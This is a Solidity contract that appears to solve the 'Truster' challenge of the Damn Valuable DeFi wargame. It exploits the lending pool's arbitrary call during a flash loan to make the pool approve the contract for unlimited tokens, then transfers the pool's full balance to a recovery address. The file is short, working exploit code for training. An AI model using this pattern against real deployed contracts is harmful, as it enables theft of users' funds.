// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract TrustMisuser {
    TrusterLenderPool public pool;
    DamnValuableToken public immutable token;
    address public recovery;

    constructor(address _pool, address _token, address _recovery) {
        pool = TrusterLenderPool(_pool);
        token = DamnValuableToken(_token);
        recovery = _recovery;
        misuser();
    }

    function misuser() public {
        bytes memory sneakApprove =
            abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max);
        pool.flashLoan(0, recovery, address(token), sneakApprove);
        token.transferFrom(address(pool), recovery, 1_000_000e18);
    }
}
